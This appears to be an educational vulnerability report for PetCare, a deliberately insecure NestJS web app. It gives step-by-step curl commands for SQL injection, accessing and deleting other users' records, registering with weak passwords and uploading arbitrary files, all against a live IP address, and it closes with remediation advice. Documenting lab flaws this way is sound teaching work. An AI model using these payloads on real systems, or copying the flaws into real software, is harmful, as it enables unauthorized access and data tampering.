# 🐾 PetCare Web Application – Vulnerability Report

## 📌 Overview

This document describes the **PetCare** web application, a deliberately insecure platform for demonstrating common web vulnerabilities from the **OWASP Top 10 (2025)**. The application is built with:

- **Frontend**: HTML/CSS/JavaScript (hosted on AWS S3)
- **Backend**: NestJS (Node.js) running on an AWS EC2 instance, with PostgreSQL database
- **API Base URL**: `http://18.222.134.61:3000`

> ⚠️ **Important**: The frontend is statically hosted and the backend API is fully exposed. An attacker can interact directly with the API using tools like **Burp Suite**, **Postman**, or **cURL** – even without the frontend. This is the core of how these vulnerabilities are exploited.

---

## 🧨 Main Vulnerabilities

### 1. SQL Injection (A05:2025 – Injection)

**Location:** `GET /pets/search?name=...`

**Description:**  
The backend concatenates the `name` parameter directly into a SQL query without using parameterization or an ORM's safe query builder. This allows an attacker to inject arbitrary SQL commands.

**Impact:**  
An attacker can retrieve all pets from the database, bypassing search logic, and potentially extract sensitive data from other tables.

**How to Exploit:**

- **Via Frontend**: In the dashboard search bar, enter:
  ```
  ' OR '1'='1
  ```
  Click **Search**. The page will display **all** pets in the database, not just those matching the search term.

- **Via cURL**:
  ```bash
  curl -X GET "http://18.222.134.61:3000/pets/search?name=' OR '1'='1" \
       -H "Authorization: Bearer <YOUR_JWT_TOKEN>"
  ```

**Screenshot to capture:** The search request and response showing all pets returned, including those belonging to other users.

---

### 2. Broken Access Control (A01:2025) – Combined

**Description:**  
The application lacks proper authorization checks on multiple endpoints. Any authenticated user can access, modify, or delete resources belonging to other users. The backend exposes endpoints that accept user IDs or pet IDs in the URL path without verifying that the authenticated user owns the resource.

**Impact:**  
An attacker can:
- View any user's pet details
- Create pets for any user
- Modify or delete any pet

**How to Exploit:**

#### a) View Any Pet – `GET /pets/:id`
- Obtain a pet ID (e.g., from search results or by brute‑forcing numeric IDs like `1`, `2`, `3`).
- Send a GET request:
  ```bash
  curl -X GET "http://18.222.134.61:3000/pets/1" \
       -H "Authorization: Bearer <YOUR_TOKEN>"
  ```
- The response returns full pet details, even if it belongs to another user.

#### b) Create Pet for Any User – `POST /pets/:userId`
- Find the target user's ID (e.g., from the database or by guessing UUIDs).
- Send a POST request:
  ```bash
  curl -X POST "http://18.222.134.61:3000/pets/<TARGET_USER_UUID>" \
       -H "Authorization: Bearer <YOUR_TOKEN>" \
       -H "Content-Type: application/json" \
       -d '{"name":"HackedPet","breed":"Test","size":"medium","age":2}'
  ```
- The pet is created with `ownerId = <TARGET_USER_UUID>`, even though you are not that user.

#### c) Update Any Pet – `PATCH /pets/:id`
  ```bash
  curl -X PATCH "http://18.222.134.61:3000/pets/1" \
       -H "Authorization: Bearer <YOUR_TOKEN>" \
       -H "Content-Type: application/json" \
       -d '{"name":"ModifiedName"}'
  ```

#### d) Delete Any Pet – `DELETE /pets/:id`
  ```bash
  curl -X DELETE "http://18.222.134.61:3000/pets/1" \
       -H "Authorization: Bearer <YOUR_TOKEN>"
  ```

**Screenshot to capture:** Two separate authenticated users – User A creates a pet, User B requests `GET /pets/1`, `PATCH /pets/1`, or `DELETE /pets/1` and succeeds.

---

### 3. Authentication Failures (A07:2025) – Combined

**Description:**  
The application stores passwords in plain text and enforces a weak password policy, making user accounts highly vulnerable to compromise.

**Impact:**  
- Anyone with database access can read all user passwords.
- Users can choose easily guessable passwords (e.g., `"a"`, `"123"`), facilitating brute‑force attacks.

**How to Exploit:**

#### a) Plaintext Passwords
Connect to the PostgreSQL database and query the `user` table:
```sql
SELECT email, password FROM "user";
```
Output reveals passwords like `"123456"`, `"password"`, etc., stored as plain text.

#### b) Weak Password Policy
Register a user with a weak password (e.g., one character):
```bash
curl -X POST "http://18.222.134.61:3000/users/register" \
     -H "Content-Type: application/json" \
     -d '{"email":"weak@example.com","password":"a","fullName":"Weak User"}'
```
The registration succeeds, demonstrating the lack of password complexity requirements.

**Screenshot to capture:** The SQL query output showing emails and plaintext passwords; the registration request with a one‑character password and the success response.

---

### 4. Insecure File Upload (Optional)

**Location:** `POST /pets` – file upload field `image`

**Description:**  
The server does not validate the file type or content. Any file is saved to the `uploads/` directory and becomes publicly accessible via the `/uploads/` route.

**Impact:**  
An attacker could upload a malicious file (e.g., a `.html` with JavaScript for XSS, a `.php` shell if PHP is installed, or a `.txt` file with malicious content) and potentially execute it or use it for phishing.

**How to Exploit:**

Upload a `.txt` file instead of an image:
```bash
curl -X POST "http://18.222.134.61:3000/pets" \
     -H "Authorization: Bearer <TOKEN>" \
     -F "name=Evil" -F "breed=Test" -F "size=medium" -F "age=1" \
     -F "image=@malicious.txt"
```
The file is stored in `uploads/` with a random name. Access it via:
```
http://18.222.134.61:3000/uploads/<filename>.txt
```

**Screenshot to capture:** The upload request and the file being served from the `/uploads` endpoint.

---

## 📝 Additional Considerations (Side Notes)

### 1. Missing Security Logging & Alerting (A09)
- No logs are generated for authentication failures, access control violations, or other security‑relevant events.
- **Impact:** Attackers can brute‑force or exploit vulnerabilities without detection.
- **Demonstration:** Perform multiple failed login attempts and check PM2 logs – no security events are recorded.

### 2. No Rate Limiting (Mishandling of Exceptional Conditions)
- There is no mechanism to limit the number of requests from a single client.
- **Impact:** Attackers can brute‑force passwords or other endpoints without being blocked.
- **Demonstration:** Send many login requests in a short time – all are accepted, and no `429 Too Many Requests` response is returned.

### 3. No HTTPS (Missing Transport Encryption)
- All traffic is sent over HTTP (no encryption).
- **Impact:** An attacker on the network can intercept and read all data, including passwords and JWT tokens (Man‑in‑the‑Middle).
- **Demonstration:** Use Burp Suite or Wireshark to capture a login request and see the password in clear text.

---

## 🛠️ Tools Recommended for Exploitation

- **Burp Suite** – intercept and modify requests, repeat them, test injection.
- **Postman** – craft custom requests with headers and bodies.
- **cURL** – command‑line tool for quick requests.
- **psql** – to query the database directly (if you have access).

---

## 🔐 Security Recommendations (for future fixes)

1. Use **parameterized queries** or TypeORM's safe query builder (e.g., `where: { name: name }`).
2. Implement **ownership checks** on every endpoint that accesses or modifies resources:
   ```typescript
   if (pet.ownerId !== req.user.id) throw new ForbiddenException();
   ```
3. Hash passwords using **bcrypt** or **Argon2** before storing.
4. Enforce a strong **password policy** (min length 8, complexity).
5. Add **logging** for authentication events, access control violations, and errors; monitor logs.
6. Implement **rate limiting** (e.g., with `@nestjs/throttler`).
7. Validate file uploads (type, size, content) and store files in a non‑public directory or use a dedicated storage service.
8. Enforce **HTTPS** using a reverse proxy (Nginx) and Let's Encrypt.

---

## ✅ Conclusion

This application demonstrates several critical security flaws that are common in real‑world applications. The vulnerabilities are easy to exploit due to the **exposed API** and **lack of proper security controls**. The documentation above provides a step‑by‑step guide to reproduce each vulnerability, which is useful for educational or demonstration purposes.

---

**End of Report**

